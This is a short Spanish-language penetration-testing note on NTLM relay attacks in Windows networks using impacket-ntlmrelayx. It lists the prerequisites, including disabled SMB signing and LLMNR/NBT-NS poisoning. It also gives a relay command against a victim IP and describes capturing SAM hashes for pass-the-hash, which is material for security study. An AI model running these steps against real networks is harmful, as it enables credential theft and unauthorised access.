# Relay Attacks 

Tags: #AD #Windows #Relay #SMB 

**impacket-ntlmrelayx** es una herramienta de la suite Impacket, desarrollada por Fortra (anteriormente SecureAuth), diseñada para ejecutar ataques de retransmisión NTLM. Este tipo de ataque explota las vulnerabilidades en el manejo de autenticación del protocolo NTLM (NT LAN Manager) en redes Windows, permitiendo a los atacantes interceptar y retransmitir credenciales para acceder a recursos y servicios de la red sin necesidad de descifrar contraseñas.

* [SMB - Relay - attacks](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-mitm-relay/#smb-signing-disabled-and-ipv4)

```bash 
# Necesitamos tener varias condiciones:

1. Mirar la IP de la maquina de atacante
2. Que el 'SMB' este como 'SMB Signing Disabled' o 'Signing = False' 
3. Utilizando técnicas de envenenamiento de LLMNR y NBT-NS, el atacante puede hacer que las solicitudes de autenticación se dirijan a su máquina, esto se hará por medio de la tool de 'Impacket'.
```

```bash 
# En la maquina de atacante ejecutamos el comando 
❯ impacket-ntlmrelayx --no-http-server -smb2support -t smb://10.0.1.249

	# smb = IP de la maquina victima que tiene el SMB no firmado 


# Importante: 
1. Este ataque hará un Man-in-the-middle, por lo que estará escuchando hasta que capture el HASH de SAM
2. Debemos hacer que la victima ingrese a un directorio que apunte a la 'IP del atacante' para generar tráfico y poder capturar el HASH de SAM.
3. Una vez capturado el HASH se puede hacer 'Pass-the-hash' para autenticarse. 
```